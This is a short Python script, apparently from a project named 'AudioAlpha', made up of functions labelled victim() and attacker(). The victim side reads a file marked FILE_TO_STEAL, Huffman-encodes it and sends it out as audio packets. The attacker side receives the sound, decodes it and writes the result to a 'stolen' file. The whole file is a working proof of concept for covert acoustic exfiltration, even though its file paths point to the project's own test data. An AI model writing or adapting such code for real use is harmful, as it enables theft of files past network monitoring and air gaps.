import huffman.huffman as huffman
import huffman.freq as freq
from sound.sound_decoder import *
import textwrap

FILE_TO_STEAL = '/home/yaniv/Desktop/AudioAlpha/tests/myCodes.txt'
STOLEN_FILE = '/home/yaniv/Desktop/AudioAlpha/tests/hisCodes.txt'

def victim(soundSend,soundRecv):
    freq_dict = freq.relative_english_freq()
    freqs = list(freq_dict.items())  # HuffmanCode requires (symbol, freq) pairs.
    decimal_huffman = huffman.HuffmanCode(freqs, 10)
    with open(FILE_TO_STEAL) as f:
        data = f.read()
    huffman_data = decimal_huffman.encode(data)

    sendAudioPacket(huffman_data, soundSend,soundRecv)


def attacker(soundSend,soundRecv):
    huffmanData = recvAudioPacket(soundSend,soundRecv)

    if (huffmanData != ''):
        freq_dict = freq.relative_english_freq()
        freqs = list(freq_dict.items())  # HuffmanCode requires (symbol, freq) pairs.
        decimal_huffman = huffman.HuffmanCode(freqs, 10)
        data = decimal_huffman.decode(huffmanData) #move it from here
        #move the next section from here
        print(data)
        fd = open(STOLEN_FILE, 'w')
        fd.write(data)
        fd.close()
    else:
        print('attacker() get huffman_data null')

def main():
    # if len(sys.argv) == 2 and sys.argv[1] == 'v':
    #     victim()
    # else:
    #     attacker()
    soundSend = Encoder()
    soundRecv = Decoder()

    victim(soundSend,soundRecv)
    #attacker(soundSend,soundRecv)

if __name__ == "__main__":
   main()